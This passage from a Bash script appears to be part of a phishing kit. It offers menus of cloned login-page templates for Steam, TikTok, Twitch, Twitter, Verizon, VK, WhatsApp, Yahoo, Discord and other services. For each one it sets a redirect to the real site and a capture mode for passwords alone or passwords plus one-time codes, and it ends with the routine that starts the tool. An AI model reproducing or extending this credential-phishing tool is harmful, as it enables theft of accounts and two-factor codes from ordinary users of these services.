        rdurl="store.steampowered.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="steam"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="steam/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_steam; };;
        esac
}
#subitoit
login_subitoit(){
        site_id="subitoit"
        rdurl="www.subito.it/"
        site_name="Subitoit"
        dgfname="subitoit"
        capture_type="NOTP"
        site_template="Default"
}
#telegram
login_telegram(){
        site_id="telegram"
        rdurl="telegram.org/"
        site_name="Telegram"
        dgfname="telegram"
        capture_type="OOTP"
        site_template="Default"
}
#telenor
login_telenor(){
        site_id="telenor"
        rdurl="www.telenor.com/"
        site_name="Telenor"
        dgfname="telenor"
        capture_type="OOTP"
        site_template="Default"
}
#tiktok
login_tiktok(){
        site_name="TikTok"
        rdurl="www.tiktok.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="tiktok"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="tiktok" ;;
                2 | 02)
                        site_id="tiktok_likes"
                        capture_type="NOTP"
                        site_template="Likes"
                        dgfname="tiktok_likes" ;;
                3 | 03)
                        site_id="tiktok_likes/otp"
                        capture_type="POTP"
                        site_template="Likes/OTP"
                        dgfname="tiktok_likes" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_tiktok; };;
        esac
}
#twitch
login_twitch(){
        site_name="Twitch"
        rdurl="www.twitch.tv/"
        echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="twitch"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="twitch" ;;
                2 | 02)
                        site_id="twitch/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="twitch" ;;
                3 | 03)
                        site_id="twitch_new"
                        capture_type="NOTP"
                        site_template="New"
                        dgfname="twitch_new" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_twitch; };;
        esac
}
#twitter
login_twitter(){
        site_name="Twitter"
        dgfname="twitter"
        rdurl="twitter.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="twitter"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="twitter/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_twitter; };;
        esac
}
#ubereats
login_ubereats(){
        site_name="ubereats"
        dgfname="ubereats"
        rdurl="www.ubereats.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="ubereats"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="ubereats/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; login_ubereats; };;
        esac
}
#verizon
login_verizon(){
        site_name="Verizon"
        dgfname="verizon"
        rdurl="www.verizon.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="verizon"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="verizon/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_verizon; };;
        esac
}
#visim
login_visim(){
        site_id="visim"
        rdurl="www.myvi.in/"
        site_name="VI sim"
        dgfname="visim"
        capture_type="OOTP"
        site_template="Default"
}
#vk
login_vk(){
        site_name="VK"
        rdurl="vk.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
        echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="vk"
                        capture_type="NOTP"
                        site_template="Default"
                        dgfname="vk" ;;
                2 | 02)
                        site_id="vk/otp"
                        capture_type="POTP"
                        site_template="OTP"
                        dgfname="vk" ;;
                3 | 03)
                        site_id="vk_poll"
                        capture_type="NOTP"
                        site_template="Poll"
                        dgfname="vk_poll" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_vk; };;
        esac
}
#whatsapp
login_whatsapp(){
        site_id="whatsapp"
        rdurl="www.web.whatsapp.com"
        site_name="WhatsApp"
        dgfname="whatsapp"
        capture_type="OOTP"
        site_template="Default"
}
#wordpress
login_wordpress(){
        site_name="Wordpress"
        dgfname="wordpress"
        rdurl="wordpress.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="wordpress"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="wordpress/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_wordpress; };;
        esac
}
#xbox
login_xbox(){
        site_name="Xbox"
        dgfname="xbox"
        rdurl="www.xbox.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="xbox"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="xbox/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_xbox; };;
        esac
}
#yahoo
login_yahoo(){
        site_name="Yahoo"
        dgfname="yahoo"
        rdurl="yahoo.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="yahoo"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="yahoo/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_yahoo; };;
        esac
}
#yandex
login_yandex(){
        site_name="Yandex"
        dgfname="yandex"
        rdurl="yandex.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="yandex"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="yandex/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_yandex; };;
        esac
}
#ytsubs
login_ytsubs(){
        site_name="YT subs"
        dgfname="ytsubs"
        rdurl="www.youtube.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="ytsubs"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="ytsubs/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_ytsubs; };;
        esac
}

#discord
login_discord(){
        site_name="Discord"
        dgfname="discord"
        rdurl="www.discord.com"
        status_display
        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
        echo -e ""
        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
        echo -e " ${NC}"
        read -p "${prompt}" reply_site

        case $reply_site in
                1 | 01)
                        site_id="discord"
                        capture_type="NOTP"
                        site_template="Default" ;;
                2 | 02)
                        site_id="discord/otp"
                        capture_type="POTP"
                        site_template="OTP" ;;
                X | x)
                        menu_login;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; banner; login_discord; };;
        esac
}
#googlewifi
login_googlewifi(){
        site_id="googlewifi"
        rdurl="fiber.google.com/wifi/"
        site_name="Google WIFI"
        dgfname="google_wifi"
        capture_type="NOTP"
        site_template="Default"
}
#pattern
login_pattern(){
        site_id="pattern"
        rdurl=""
        dgfname="pattern"
        site_name="Pattern"
        capture_type="NOTP"
        site_template="Default"
}

##MAIN
clear
cbanner
directories
kill_pid
dependencies
xpermission
homepage